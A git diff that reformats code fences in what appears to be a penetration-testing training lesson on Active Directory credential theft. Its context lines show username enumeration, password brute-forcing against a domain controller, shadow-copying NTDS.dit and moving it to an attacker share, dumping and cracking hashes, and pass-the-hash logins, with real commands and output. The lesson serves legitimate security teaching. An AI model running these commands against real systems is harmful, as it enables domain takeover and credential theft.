@@ -41,8 +41,7 @@ Let's say we have done our research and gathered a list of names based on public
 
 We can create a custom list on our attack host using the names above. We can use a command line-based text editor like `Vim` or a graphical text editor to create our list. Our list may look something like this:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat usernames.txt
 
 bwilliamson
@@ -63,8 +62,7 @@ Of course, this is just an example and doesn't include all of the names, but not
 
 We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using `Git`, we can run it against a list of real names as shown in the example output below:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
 
 ben
@@ -149,8 +147,7 @@ It is ideal to limit the need to guess as much as possible when conducting passw
 
 Before we start guessing passwords for usernames which might not even exist, it may be worthwhile identifying the correct naming convention and confirming the validity of some usernames. We can do this with a tool like [Kerbrute](https://github.com/ropnop/kerbrute). Kerbrute can be used for brute-forcing, password spraying and username enumeration. Right now, we are only interested in username enumeration, which would look like this:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
 
     __             __               __     
@@ -172,8 +169,7 @@ Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop
 
 Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch a brute-force attack against the target domain controller using a tool such as NetExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 
 SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
@@ -205,8 +201,7 @@ Once we have discovered some credentials, we could proceed to try to gain remote
 
 We can connect to a target DC using the credentials we captured.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
 ```
 
@@ -216,8 +211,7 @@ Evil-WinRM connects to a target using the Windows Remote Management service comb
 
 Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\> net localgroup
 
 Aliases for \\DC01
@@ -263,8 +257,7 @@ We are looking to see if the account has local admin rights. To make a copy of t
 
 #### Checking user account privileges including domain
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\> net user bwilliamson
 
 User name                    bwilliamson
@@ -300,8 +293,7 @@ This account has both Administrators and Domain Administrator rights which means
 
 We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on `C:` as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup and disaster recovery software to perform operations.
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
 
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
@@ -316,8 +308,7 @@ Successfully created shadow copy for 'C:\'
 
 We can then copy the `NTDS.dit` file from the volume shadow copy of `C:` onto another location on the drive to prepare to move NTDS.dit to our attack host.
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 
         1 file(s) copied.
@@ -331,8 +322,7 @@ Before copying `NTDS.dit` to our attack host, we may want to use the technique w
 
 Now `cmd.exe /c move` can be used to move the file from the target DC to the share on our attack host.
 
-```
-        shellsession
+```shellsession
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
 
         1 file(s) moved.
@@ -342,8 +332,7 @@ Now `cmd.exe /c move` can be used to move the file from the target DC to the sha
 
 With a copy of `NTDS.dit` on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's `secretsdump`:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -364,8 +353,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
 
 Alternatively, we may benefit from using NetExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 
 SMB         10.129.201.57   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
@@ -418,8 +406,7 @@ We can proceed with creating a text file containing all the NT hashes, or we can
 
 #### Cracking a single hash with Hashcat
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
 64f12cddaa88057e06a81b54e73b949b:Password1
@@ -435,8 +422,7 @@ We can still use hashes to attempt to authenticate with a system using a type of
 
 #### Pass the Hash (PtH) with Evil-WinRM Example
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 ```
 
